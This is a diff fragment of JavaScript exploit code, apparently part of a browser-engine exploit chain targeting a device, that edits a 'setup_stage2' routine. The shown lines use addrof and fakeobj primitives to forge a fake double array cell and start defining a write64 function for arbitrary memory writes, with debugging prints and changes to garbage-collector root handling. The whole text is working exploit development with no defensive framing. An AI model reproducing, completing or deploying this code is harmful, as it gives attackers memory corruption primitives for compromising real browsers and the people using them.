@@ -18328,7 +18328,6 @@ const device_chipset = {
           print("setup_stage2: addrof/fakeobj installed");
           let scribble_element;
           let scribbles = [];
-          p.stage2_roots = scribbles;
           let prev_addr = 0n;
           print("setup_stage2: stride search begin");
           for (let i = 0; i < 1000; ++i) {
@@ -18356,9 +18355,6 @@ const device_chipset = {
             p1: fake_sentinel,
             p2: scribble_element
           };
-          // Keep real holders alive, but do not put fake objects in a real
-          // roots array. GC/write barriers may treat them as ordinary cells.
-          scribbles.push(change_scribble_holder);
           print("setup_stage2: change_scribble_holder built");
           print("setup_stage2: creating change_scribble");
           print("setup_stage2: addrof change_scribble_holder begin");
@@ -18374,8 +18370,11 @@ const device_chipset = {
           print("setup_stage2: reading double_array_cell");
           let double_array_cell = BigInt.fromDouble(change_scribble[0]);
           print(`setup_stage2: double_array_cell=${double_array_cell.hex()}`);
-          print("setup_stage2: installing fake double array cell");
-          change_scribble_holder.p1 = p.fakeobj(double_array_cell);
+          print("setup_stage2: fake double array cell begin");
+          let fake_double_array_cell = p.fakeobj(double_array_cell);
+          print("setup_stage2: fake double array cell created");
+          change_scribble_holder.p1 = fake_double_array_cell;
+          print("setup_stage2: fake double array cell installed");
           const original_cell = change_scribble[0];
           print(`setup_stage2: original_cell=${BigInt.fromDouble(original_cell).hex()}`);
           p.write64 = function (addr, value) {
